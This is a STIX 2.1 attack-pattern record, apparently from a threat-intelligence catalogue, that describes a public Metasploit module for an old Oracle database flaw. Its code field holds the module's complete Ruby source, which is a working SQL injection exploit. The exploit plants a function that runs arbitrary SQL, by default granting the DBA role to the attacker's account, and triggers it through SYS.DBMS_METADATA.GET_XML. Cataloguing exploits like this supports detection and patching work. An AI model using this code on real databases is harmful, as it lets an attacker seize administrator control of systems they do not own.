{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--360c5212-9ac6-4666-beb7-b370b233f305",
    "created": "2024-08-14T16:22:08.693213Z",
    "modified": "2024-08-14T16:22:08.693217Z",
    "name": "Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_XML",
    "description": " This module will escalate an Oracle DB user to DBA by exploiting a sql injection bug in the SYS.DBMS_METADATA.GET_XML package/function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/dbms_metadata_get_xml.rb",
            "external_id": "dbms_metadata_get_xml.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.metasploit.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_METADATA.GET_XML',\n      'Description'    => %q{\n        This module will escalate an Oracle DB user to DBA by exploiting a sql injection\n        bug in the SYS.DBMS_METADATA.GET_XML package/function.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.metasploit.com' ],\n        ],\n      'DisclosureDate' => '2008-01-05'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execute.',  \"GRANT DBA to #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name = Rex::Text.rand_text_alpha(rand(10) + 1)\n\n    function = \"\n      create or replace function #{datastore['DBUSER']}.#{name} return varchar2\n      authid current_user is pragma autonomous_transaction;\n      begin\n      execute immediate '#{datastore['SQL']}';\n      return '';\n      end;\n      \"\n\n    package = \"select sys.dbms_metadata.get_xml('''||#{datastore['DBUSER']}.#{name}()||''','') from dual\"\n\n    clean = \"drop function #{name}\"\n\n    print_status(\"Sending function...\")\n    prepare_exec(function)\n\n    begin\n      print_status(\"Attempting sql injection on SYS.DBMS_METADATA.GET_XML...\")\n      prepare_exec(package)\n    rescue ::OCIError => e\n      print_status(\"Removing function '#{name}'...\")\n      prepare_exec(clean)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-05"
}